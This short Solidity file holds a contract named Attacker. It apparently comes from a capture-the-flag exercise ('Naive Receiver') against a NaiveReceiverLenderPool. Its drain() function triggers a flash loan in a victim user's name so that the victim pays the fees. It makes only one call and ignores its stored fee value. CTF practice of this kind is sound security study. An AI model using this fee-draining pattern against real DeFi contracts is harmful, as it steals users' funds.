// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

contract Attacker {

    NaiveReceiverLenderPool public lender;
    uint public fee;
    address user;

    constructor( address payable _lender, uint _fee, address _user ){
        lender = NaiveReceiverLenderPool(_lender);
        fee = _fee;
        user = _user;
    }

    function drain() public {
        lender.flashLoan(user, 9 ether);
    }


}